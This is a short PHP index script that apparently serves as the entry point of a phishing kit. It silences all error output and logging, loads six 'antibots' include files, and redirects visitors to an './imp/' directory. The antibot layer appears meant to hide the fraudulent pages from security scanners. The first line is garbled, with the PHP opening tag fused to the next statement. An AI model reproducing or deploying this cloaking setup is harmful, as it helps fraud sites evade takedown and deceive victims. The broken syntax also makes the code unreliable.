<?phperror_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include './imp/antibots/antibots1.php';
include './imp/antibots/antibots2.php';
include './imp/antibots/antibots3.php';
include './imp/antibots/antibots4.php';
include './imp/antibots/antibots5.php';
include './imp/antibots/antibots6.php';
header('Location: ./imp/');
?>